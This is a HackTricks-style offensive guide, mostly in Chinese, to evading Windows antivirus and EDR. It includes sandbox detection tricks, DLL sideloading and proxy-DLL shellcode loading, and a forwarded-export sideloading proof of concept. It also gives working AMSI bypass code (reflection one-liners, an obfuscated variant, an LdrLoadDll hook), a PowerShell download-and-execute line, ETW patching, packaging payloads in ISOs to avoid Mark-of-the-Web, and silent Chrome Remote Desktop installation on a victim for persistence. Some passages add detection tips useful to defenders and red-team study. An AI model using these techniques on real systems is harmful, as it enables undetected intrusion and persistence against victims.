# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**本页作者为** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## 停止 Defender

- [defendnot](https://github.com/es3n1n/defendnot): 一个用于让 Windows Defender 停止运行的工具。
- [no-defender](https://github.com/es3n1n/no-defender): 一个通过伪装成另一个 AV 来让 Windows Defender 停止运行的工具。
- [如果你是管理员，禁用 Defender](basic-powershell-for-pentesters/README.md)

## **AV 绕过方法论**

目前，AV 使用不同的方法来判断文件是否为恶意，主要包括静态检测、动态分析，以及对于更高级的 EDR，还会有行为分析。

### **静态检测**

静态检测通过在二进制或脚本中标记已知的恶意字符串或字节数组来实现，同时还会从文件本身提取信息（例如文件描述、公司名称、数字签名、图标、校验和等）。这意味着使用已知的公共工具可能更容易被发现，因为它们很可能已被分析并标记为恶意。有几种方法可以规避这类检测：

- **加密**

如果你对二进制进行加密，AV 就无法检测你的程序，但你需要某种 loader 在内存中解密并运行程序。

- **混淆**

有时候只需要更改二进制或脚本中的一些字符串就能通过 AV，但这可能会根据你要混淆的内容耗费大量时间。

- **自定义工具**

如果你开发自己的工具，就不会有已知的恶意签名，但这需要大量时间和精力。

> [!TIP]
> 检查 Windows Defender 静态检测的一个好方法是 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)。它基本上将文件拆分成多个片段，然后让 Defender 分别扫描每一段，这样可以准确告诉你二进制中哪些字符串或字节被标记。

强烈建议你查看这个关于实用 AV Evasion 的 [YouTube 播放列表](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)。

### **动态分析**

动态分析是指 AV 在沙箱中运行你的二进制并观察是否有恶意活动（例如尝试解密并读取浏览器密码、对 LSASS 执行 minidump 等）。这部分处理起来会更棘手，但你可以采取一些措施来规避沙箱。

- **执行前休眠** 根据实现方式不同，这是绕过 AV 动态分析的好方法。AV 为了不打断用户工作流，扫描文件的时间非常短，所以使用长时间休眠可以干扰二进制的分析。问题是，许多 AV 的沙箱可能会根据实现方式直接跳过休眠。
- **检查机器资源** 通常沙箱的资源非常有限（例如 < 2GB RAM），否则会拖慢用户机器。你也可以在这里发挥创意，例如检查 CPU 温度或风扇转速，沙箱不一定实现所有这些检测。
- **机器特定检查** 如果你想针对加入了 "contoso.local" 域的工作站，可以检查计算机的域是否与你指定的匹配，如果不匹配，你可以让程序退出。

事实证明，Microsoft Defender 的 Sandbox 计算机名是 HAL9TH，所以你可以在程序触发前检查计算机名，如果匹配 HAL9TH，说明你在 defender 的沙箱中，这时可以让程序退出。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>来源： <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

以下是一些来自 [@mgeeky](https://twitter.com/mariuszbit) 关于对抗沙箱的非常好的提示

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev 频道</p></figcaption></figure>

如同本文前面所说，**公共工具**最终会被**检测到**，所以，你应该问自己：

例如，如果你想转储 LSASS，**你真的需要使用 mimikatz 吗**？或者你能否使用另一个不那么知名且也能转储 LSASS 的项目。

正确的答案很可能是后者。以 mimikatz 为例，它可能是被 AV 和 EDR 标记得最多的项目之一，虽然该项目本身很酷，但要绕过 AV 使用它也是一场噩梦，所以找替代方案来实现你的目标。

> [!TIP]
> 在为了规避而修改 payload 时，确保在 defender 中**关闭自动样本提交**，并且，请认真对待，**不要将样本上传到 VIRUSTOTAL**，如果你的目标是长期实现 evasions。如果你想检查你的 payload 是否被特定 AV 检测，最好在 VM 上安装该 AV，尝试关闭自动样本提交，并在那儿进行测试直到满意为止。

## EXEs vs DLLs

只要可能，总是**优先使用 DLL 来实现绕过**，根据我的经验，DLL 文件通常**被检测和分析的概率要低得多**，所以在某些情况下（前提是你的 payload 可以以 DLL 形式运行）这是一个非常简单且有效的规避技巧。

如图所示，Havoc 的一个 DLL Payload 在 antiscan.me 的检测率为 4/26，而 EXE payload 的检测率为 7/26。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me 比较常规 Havoc EXE payload 与 常规 Havoc DLL</p></figcaption></figure>

下面我们将展示一些可以在 DLL 文件上使用以更隐蔽的技巧。

## DLL Sideloading & Proxying

**DLL Sideloading** 利用 loader 的 DLL 搜索顺序，通过将受害应用程序和恶意 payload 放置在一起实现加载替代。

你可以使用 [Siofra](https://github.com/Cybereason/siofra) 和下面的 PowerShell 脚本来检查易受 DLL Sideloading 影响的程序：
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
该命令将输出位于 "C:\Program Files\\" 中易受 DLL hijacking 攻击的程序列表，以及它们尝试加载的 DLL 文件。

我强烈建议你 **自行探索 DLL Hijackable/Sideloadable programs**，如果正确实施，这种技术非常隐蔽，但如果你使用公开已知的 DLL Sideloadable programs，可能很容易被发现。

仅仅通过放置一个名称与程序期望加载的 DLL 相同的恶意 DLL 并不会载入你的 payload，因为程序期望该 DLL 中包含某些特定函数。为了解决这个问题，我们将使用另一种名为 **DLL Proxying/Forwarding** 的技术。

**DLL Proxying** 会将程序从代理（和恶意）DLL 发出的调用转发到原始 DLL，从而保持程序的功能并能够处理 payload 的执行。

我将使用来自 [@flangvik](https://twitter.com/Flangvik/) 的 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 项目。

以下是我遵循的步骤：
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最后一个命令会给我们两个文件：一个 DLL 源代码模板和原始已重命名的 DLL。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> I **highly recommend** you watch [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) about DLL Sideloading and also [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) to learn more about what we've discussed more in-depth.

### 滥用 Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- 如果 `TargetDll` 尚未加载，则加载它
- 从中解析 `TargetFunc`

需要理解的关键行为：
- 如果 `TargetDll` 是 KnownDLL，则它从受保护的 KnownDLLs 命名空间提供（例如 ntdll, kernelbase, ole32）。
- 如果 `TargetDll` 不是 KnownDLL，则使用正常的 DLL 搜索顺序，其中包括执行转发解析的模块所在目录。

这就启用了一个间接的 sideloading 原语：找到一个将函数转发到非 KnownDLL 模块名的已签名 DLL，然后将该已签名 DLL 与一个攻击者控制的、名称与转发目标模块完全相同的 DLL 放在同一目录。当调用转发导出时，加载器会解析转发并从同一目录加载你的 DLL，执行你的 DllMain。

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` 不是 KnownDLL，因此通过正常的搜索顺序解析。

PoC (复制粘贴):
1) 将已签名的系统 DLL 复制到可写的文件夹中
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 在同一文件夹中放置一个恶意的 `NCRYPTPROV.dll`。一个最小的 DllMain 就足以实现代码执行；你不需要实现被转发的函数来触发 DllMain。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 使用已签名的 LOLBin 触发转发：
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) 加载并排（side-by-side）的 `keyiso.dll` (signed)
- 在解析 `KeyIsoSetAuditingInterface` 时，加载器会跟随转发到 `NCRYPTPROV.SetAuditingInterface`
- 加载器随后从 `C:\test` 加载 `NCRYPTPROV.dll` 并执行其 `DllMain`
- 如果 `SetAuditingInterface` 未实现，你只有在 `DllMain` 已经运行后才会收到 "missing API" 错误

Hunting tips:
- 重点关注目标模块不是 KnownDLL 的 forwarded exports。KnownDLLs 列表位于 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`。
- 你可以使用如下工具枚举 forwarded exports：
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 查看 Windows 11 forwarder 清单以搜索候选项: https://hexacorn.com/d/apis_fwd.txt

检测/防御 建议:
- 监控 LOLBins（例如 rundll32.exe）从非系统路径加载签名的 DLL，然后从该目录加载具有相同基名的非-KnownDLLs
- 在用户可写路径下对类似这样的进程/模块链发出警报: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll`
- 强制实施代码完整性策略（WDAC/AppLocker），并在应用程序目录中禁止写入并执行

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

你可以使用 Freeze 以隐蔽的方式加载并执行你的 shellcode。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 规避检测只是一个猫鼠游戏，今天有效的方法明天可能就会被检测到，因此不要只依赖单一工具，尽可能尝试串联多种规避技术。

## AMSI (Anti-Malware Scan Interface)

AMSI 是为防止 "fileless malware" 而创建的。最初，AVs 只能扫描磁盘上的文件，所以如果你以某种方式直接在内存中执行 payload，AV 无法阻止，因为它没有足够的可见性。

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

它允许防病毒解决方案通过以未加密且未混淆的形式暴露脚本内容来检查脚本行为。

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

注意它如何在前面加上 `amsi:`，然后显示运行脚本的可执行文件路径（在本例中为 powershell.exe）。

We didn't drop any file to disk, but still got caught in-memory because of AMSI.

此外，从 **.NET 4.8** 开始，C# 代码也会经过 AMSI 扫描。这甚至影响 `Assembly.Load(byte[])` 的内存加载执行。因此，如果想规避 AMSI，建议使用较低版本的 .NET（例如 4.7.2 或更低）进行内存执行。

There are a couple of ways to get around AMSI:

- **Obfuscation**

由于 AMSI 主要依赖静态检测，修改你尝试加载的脚本通常是规避检测的一个好方法。然而，AMSI 有能力对多层混淆的脚本进行反混淆，所以 obfuscation 的效果取决于具体实施方式，可能并不是一个可靠的选项。这使得规避并不那么直接。尽管如此，有时只需更改几个变量名就能通过，具体取决于被标记的程度。

- **AMSI Bypass**

由于 AMSI 是通过将 DLL 注入到 powershell（以及 cscript.exe、wscript.exe 等）进程中来实现的，即便以非特权用户身份运行，也可以轻易篡改它。基于 AMSI 实现中的这个缺陷，研究人员发现了多种绕过 AMSI 扫描的方法。

**Forcing an Error**

强制 AMSI 初始化失败（amsiInitFailed）会导致当前进程不进行任何扫描。最初由 [Matt Graeber](https://twitter.com/mattifestation) 披露，Microsoft 已经开发了签名以防止其被广泛利用。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
仅需一行 powershell 代码就能使当前 powershell 进程中的 AMSI 无法正常工作。 当然，这行代码已被 AMSI 本身检测到，因此需要进行一些修改才能使用该技术。

下面是我从这个 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) 取得的一个修改过的 AMSI bypass。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Please read [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) for a more detailed explanation.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
注意
- 适用于 PowerShell、WScript/CScript 以及自定义加载器（任何会加载 AMSI 的情形）。
- 可与通过 stdin 提供脚本（`PowerShell.exe -NoProfile -NonInteractive -Command -`）配合使用，以避免长命令行痕迹。
- 已见于通过 LOLBins 执行的加载器（例如，调用 `DllRegisterServer` 的 `regsvr32`）。

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**移除检测到的签名**

你可以使用诸如 **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 和 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** 的工具，从当前进程的内存中移除被检测到的 AMSI 签名。这些工具通过扫描当前进程的内存以查找 AMSI 签名，然后用 NOP 指令覆盖，实质上将其从内存中移除。

**使用 AMSI 的 AV/EDR 产品**

可以在 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** 找到使用 AMSI 的 AV/EDR 产品列表。

**Use Powershell version 2**
如果使用 PowerShell version 2，则不会加载 AMSI，因此可以在不被 AMSI 扫描的情况下运行脚本。你可以这样做：
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging 是一个功能，允许记录系统上执行的所有 PowerShell 命令。 这对审计和故障排查很有用，但对于想要规避检测的攻击者来说也是一个**问题**。

要绕过 PowerShell logging，你可以使用以下技术：

- **Disable PowerShell Transcription and Module Logging**: 你可以使用诸如 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 之类的工具来实现。
- **Use Powershell version 2**: 如果使用 PowerShell version 2，AMSI 不会被加载，因此可以运行脚本而不被 AMSI 扫描。可以这样做：`powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: 使用 [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) 来生成一个不含防护的 powershell 会话（这也是 Cobal Strike 的 `powerpick` 所使用的）。


## Obfuscation

> [!TIP]
> 某些混淆技术依赖于对数据进行加密，这会增加二进制文件的熵，从而更容易被 AVs 和 EDRs 检测到。对此要谨慎，建议只对代码中敏感或需要隐藏的特定部分应用加密。

### Deobfuscating ConfuserEx-Protected .NET Binaries

在分析使用 ConfuserEx 2（或其商业分支）的恶意软件时，常会遇到多层保护，阻止反编译器和沙箱分析。下面的流程可以可靠地**还原接近原始的 IL**，随后可以在 dnSpy 或 ILSpy 等工具中反编译为 C#。

1.  Anti-tampering removal – ConfuserEx 会对每个 *method body* 加密，并在 *module* 的静态构造函数 (`<Module>.cctor`) 中解密。这也会修改 PE checksum，因此任何改动都会导致二进制崩溃。使用 **AntiTamperKiller** 来定位加密的元数据表，恢复 XOR 密钥并重写为干净的程序集：
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
输出包含 6 个 anti-tamper 参数（`key0-key3`、`nameHash`、`internKey`），在构建自定义 unpacker 时可能有用。

2.  Symbol / control-flow recovery – 将 *clean* 文件交给 **de4dot-cex**（一个支持 ConfuserEx 的 de4dot 分支）。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – 选择 ConfuserEx 2 配置文件  
• de4dot 会撤销控制流平坦化，恢复原始的命名空间、类和变量名，并解密常量字符串。

3.  Proxy-call stripping – ConfuserEx 用轻量级包装器（即 *proxy calls*）替换直接方法调用，以进一步阻碍反编译。使用 **ProxyCall-Remover** 将它们移除：
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
完成此步骤后，你应该能看到正常的 .NET API，例如 `Convert.FromBase64String` 或 `AES.Create()`，而不是不透明的包装函数（`Class8.smethod_10` 等）。

4.  Manual clean-up – 在 dnSpy 中运行生成的二进制，搜索大型 Base64 数据块或 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 的使用，以定位*真实*载荷。恶意软件通常将其存储为在 `<Module>.byte_0` 中初始化的 TLV 编码字节数组。

上述链条在**无需**运行恶意样本的情况下还原执行流程——在离线工作站上分析时非常有用。

> 🛈  ConfuserEx 会生成一个名为 `ConfusedByAttribute` 的自定义属性，可作为 IOC 用于自动分类样本。

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 该项目旨在提供一个开源的 [LLVM](http://www.llvm.org/) 编译套件分支，通过 [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) 和防篡改来提高软件安全性。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator 演示如何使用 `C++11/14` 语言在编译时生成 obfuscated code，而无需使用任何外部工具或修改编译器。
- [**obfy**](https://github.com/fritzone/obfy): 添加由 C++ template metaprogramming framework 生成的一层 obfuscated operations，这会让想要破解应用程序的人更难一些。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz 是一个 x64 binary obfuscator，能够对各种不同的 PE 文件进行混淆，包括： .exe、.dll、.sys
- [**metame**](https://github.com/a0rtega/metame): Metame 是一个用于任意可执行文件的简单 metamorphic code engine。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator 是一个针对 LLVM-supported languages 的细粒度 code obfuscation 框架，使用 ROP (return-oriented programming)。ROPfuscator 通过将常规指令转换为 ROP chains 在汇编级别对程序进行混淆，从而打破我们对正常控制流的直观认知。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt 是用 Nim 编写的 .NET PE Crypter
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor 能够将现有的 EXE/DLL 转换为 shellcode 然后加载它们

## SmartScreen & MoTW

您可能在从互联网下载某些可执行文件并运行它们时见过这个屏幕。

Microsoft Defender SmartScreen 是一种安全机制，旨在保护终端用户免于运行可能是恶意的应用程序。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen 主要采用基于信誉的机制，这意味着不常见的下载应用会触发 SmartScreen，从而提醒并阻止终端用户执行该文件（尽管仍可通过单击 More Info -> Run anyway 来执行该文件）。

**MoTW** (Mark of The Web) 是一个名为 Zone.Identifier 的 NTFS Alternate Data Stream，下载自互联网的文件在下载时会自动创建该流，并记录其下载来源 URL。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>检查从互联网下载的文件的 Zone.Identifier ADS。</p></figcaption></figure>

> [!TIP]
> 重要的是要注意，用**受信任**的签名证书签名的可执行文件**不会触发 SmartScreen**。

防止你的 payloads 获取 Mark of The Web 的一个非常有效的方法是将它们打包到某种容器中，例如 ISO。之所以如此，是因为 Mark-of-the-Web (MOTW) **不能**应用于 **非 NTFS** 卷。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) 是一个将 payloads 打包到输出容器以规避 Mark-of-the-Web 的工具。

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) 是 Windows 中一个强大的日志机制，允许应用程序和系统组件 **记录事件**。不过，它也可能被安全产品用于监控和检测恶意活动。

类似于禁用（绕过）AMSI 的方式，也可以让用户空间进程的 **`EtwEventWrite`** 函数立即返回而不记录任何事件。方法是将该函数在内存中打补丁使其立即返回，从而有效地禁用该进程的 ETW 日志。

更多信息见 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**。


## C# Assembly Reflection

在内存中加载 C# 二进制文件已经存在相当长时间，仍然是运行你的后渗透工具而不被 AV 检测到的非常有效的方法。

因为有效载荷会直接加载到内存而不落盘，我们只需关注为整个进程打补丁以绕过 AMSI。

大多数 C2 框架 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) 已经提供了直接在内存中执行 C# assemblies 的能力，但有不同的实现方式：

- **Fork\&Run**

它涉及**生成一个新的牺牲进程**，将你的后渗透恶意代码注入该新进程，执行你的恶意代码，完成后终止该新进程。这种方法有利有弊。Fork and run 方法的好处是执行发生在我们的 Beacon 植入进程**外部**。这意味着如果我们的后渗透操作出错或被发现，**我们的植入体更有可能存活**。缺点是你**更有可能**被**行为检测（Behavioural Detections）**发现。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

这指的是将后渗透恶意代码**注入到自身进程**中。这样可以避免创建新进程并被 AV 扫描，但缺点是如果你的有效载荷执行出问题，可能会导致进程崩溃，从而有**更大概率**丢失你的 beacon。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 如果想阅读更多关于 C# Assembly 加载的内容，请查看这篇文章 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 以及他们的 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

你也可以**从 PowerShell**加载 C# Assemblies，参考 [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) 和 [S3cur3th1sSh1t 的视频](https://www.youtube.com/watch?v=oe11Q-3Akuk)。

## Using Other Programming Languages

如 [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) 中所示，可以通过让被入侵机器访问**部署在 Attacker Controlled SMB share 上的解释器环境**来使用其他语言执行恶意代码。

通过允许访问 SMB 共享上的解释器二进制和环境，你可以在被入侵机器的内存中**执行这些语言的任意代码**。

该仓库指出：Defender 仍然会扫描脚本，但通过利用 Go、Java、PHP 等语言，我们在**绕过静态签名**方面有更多灵活性。使用这些语言的随机、未混淆的 reverse shell 脚本进行测试已证明是成功的。

## TokenStomping

Token stomping 是一种技术，允许攻击者**操纵访问令牌或像 EDR 或 AV 这样的安全产品**，使其权限被降低，从而进程不会被终止，但没有权限检查恶意活动。

为防止这种情况，Windows 可以**阻止外部进程**获取安全进程的令牌句柄。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

如 [**这篇博客文章**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) 所述，只需在受害者电脑上部署 Chrome Remote Desktop 就很容易接管并维持持久性：
1. 从 https://remotedesktop.google.com/ 下载，点击 "Set up via SSH"，然后点击 Windows 的 MSI 文件以下载。
2. 在受害者主机上以管理员身份静默运行安装程序：`msiexec /i chromeremotedesktophost.msi /qn`
3. 回到 Chrome Remote Desktop 页面并点击下一步。向导会要求你授权；点击 Authorize 按钮继续。
4. 以适当调整执行给定参数：`"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（注意 pin 参数允许在不使用 GUI 的情况下设置 PIN）。

## Advanced Evasion

Evasion 是一个非常复杂的主题，有时你需要在单个系统中考虑许多不同的遥测来源，所以在成熟环境中完全不被发现几乎不可能。

你所面对的每个环境都有其自身的强项和弱点。

强烈建议你去看 [@ATTL4S](https://twitter.com/DaniLJ94) 的这场演讲，以便更好地了解更高级的 Evasion 技术。

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

这是来自 [@mariuszbit](https://twitter.com/mariuszbit) 的另一场关于 Evasion in Depth 的精彩演讲。

{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

你可以使用 [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)，它会**逐步移除二进制的部分内容**，直到**找出 Defender 认为是恶意的部分**并将其拆分给你。\
另一个做相同事情的工具是 [**avred**](https://github.com/dobin/avred)，它在 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) 提供了开放的 web 服务。

### **Telnet Server**

